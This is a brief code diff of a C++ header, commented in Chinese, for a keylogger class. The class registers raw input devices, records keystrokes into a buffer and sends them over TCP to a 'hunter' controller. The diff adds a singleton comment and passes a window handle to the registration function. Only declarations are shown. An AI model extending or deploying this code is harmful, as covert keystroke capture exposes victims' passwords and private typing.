@@ -1,5 +1,6 @@
 // 通过接收原始输入设备信息
 // 获取键盘数据 发送至hunter端
+// 是使用单例模式设计的类 只有唯一一个实例
 
 #pragma once
 #include "TcpSocket.h"
@@ -29,7 +30,7 @@ public:
 
 
 	// 注册原始输入设备
-	static BOOL regist();
+	static BOOL regist(HWND hWnd);
 	// 获取输入数据并保存至类缓冲区
 	static BOOL getKeybdData(LPARAM lParam);
 	// 保存按键信息到类缓冲区
